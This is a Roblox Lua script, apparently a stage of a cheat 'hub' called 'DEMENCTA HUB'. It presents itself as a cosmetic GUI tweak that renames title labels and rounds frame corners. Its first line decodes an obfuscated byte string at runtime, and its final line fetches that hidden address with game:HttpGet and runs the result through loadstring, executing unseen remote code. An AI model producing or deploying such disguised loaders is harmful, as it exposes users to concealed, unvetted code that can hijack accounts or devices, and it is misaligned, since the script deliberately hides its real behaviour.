
--[[ STAGE 2: VISUAL CORE ]]
local cAB_gCCYw_57sDCktg81="\143\100\152\163\103\180\187\104\129\127\137\069\069\072\087\035\043\042\083\032\121\121\073\079\094\029\015\023\239\007\027\246\251\199\198\254\215\244\195\030\201\167\221\171\175\186\134\210\177\132\147\142\151\155\157\139\153\122\105\155\133\065\065\066\083\154\088\037\091\062\055\040\063\001\058\072\014\026\026\018\227\228\233\238\252\198\194\012\203\210\203\027\174\161\165\177\176\186\179\143\135\146\157\139\099\155\104\110\109\177\067\114\076\138\151\103\089\039\044\041\046"local PWC27bPGe5rhbFmWRvm=102 local itFIDAle2khSdsG59b=114 local GOWiJf1FQBQu=1 local LFersvIbG5dz=5 local XLtKXto6OBSvqUZmG=17 local GqXOQV365pTjd4hM2zIk=true local ViIy_hjpE8dQyJ=bit32 and bit32.bxor if not ViIy_hjpE8dQyJ then ViIy_hjpE8dQyJ=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local WeJMeXdAIy6xUImm={}for OPDQmcYiTaM6HLMDpCx=1,#cAB_gCCYw_57sDCktg81 do local h301mf_8A3fpo2Yz=string.byte(cAB_gCCYw_57sDCktg81,OPDQmcYiTaM6HLMDpCx)local MsE3SGOmASsUexTEbTm6GF=(itFIDAle2khSdsG59b+(OPDQmcYiTaM6HLMDpCx*LFersvIbG5dz)+XLtKXto6OBSvqUZmG)%256 if GOWiJf1FQBQu==0 then h301mf_8A3fpo2Yz=(h301mf_8A3fpo2Yz-MsE3SGOmASsUexTEbTm6GF)%256 WeJMeXdAIy6xUImm[OPDQmcYiTaM6HLMDpCx]=string.char(ViIy_hjpE8dQyJ(h301mf_8A3fpo2Yz,PWC27bPGe5rhbFmWRvm))else h301mf_8A3fpo2Yz=ViIy_hjpE8dQyJ(h301mf_8A3fpo2Yz,PWC27bPGe5rhbFmWRvm)WeJMeXdAIy6xUImm[OPDQmcYiTaM6HLMDpCx]=string.char((h301mf_8A3fpo2Yz-MsE3SGOmASsUexTEbTm6GF)%256)end end local NFWzdbsuGstLa_95pe5K=table.concat(WeJMeXdAIy6xUImm)if GqXOQV365pTjd4hM2zIk then NFWzdbsuGstLa_95pe5K=string.reverse(NFWzdbsuGstLa_95pe5K)end local RjdFeurBC0NJXKB=NFWzdbsuGstLa_95pe5K
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(RjdFeurBC0NJXKB))()
